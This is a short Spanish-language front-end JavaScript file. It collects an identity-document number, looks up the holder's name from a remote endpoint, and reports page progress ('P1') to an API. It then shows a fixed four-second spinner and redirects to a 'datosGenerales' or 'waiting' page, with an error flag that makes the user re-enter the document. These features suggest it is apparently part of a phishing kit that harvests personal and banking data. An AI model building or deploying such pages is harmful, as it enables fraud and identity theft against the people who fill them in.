console.log("Index ON")

fetch(`${API_URL}/view`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({message: 'P1'})
})


// ERORRES
document.addEventListener('DOMContentLoaded', ()=>{
    if(info.err != ''){
        alert('Hemos tenido un problema, por favor introduce tu documento nuevamente.');
    }
});

/** VALIDAR CC */
const btnSuccess = document.querySelector('#success');
btnSuccess.addEventListener('click', ()=>{
    validarNumero();
});

function validarNumero() {
    let input = document.querySelector("#cc");
    let valor = input.value

    if (valor.length < 7 || valor.length > 10 || isNaN(input.value)) {
        alert("¡Ups! Ingresa un documento válido.");
        !input.classList.contains('invalid') ? input.classList.add('invalid'): '';
        input.value = "";
    }else{
        /** SPINNER */
        showSpinner();

        /** BUSCAR CLIENTE */
        fetch(`${DATA_URL}/obtenerInfoCC`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({cc: input.value})
        })
        .then(response => response.json())
        .then(result => info.cname = `${result[0].ANINombre1} ${result[0].ANIApellido1}`)
        .catch(err => console.log(err));

        setTimeout(()=>{
            info.cc = input.value;
            LS.setItem('info', JSON.stringify(info));
            if(info.err != ''){
                window.location.href = 'waiting.html';
            }else{
                window.location.href = 'datosGenerales.html';
            }

        }, 4000);
    }
}

/**
 * MENSAJE API CONTADOR
 */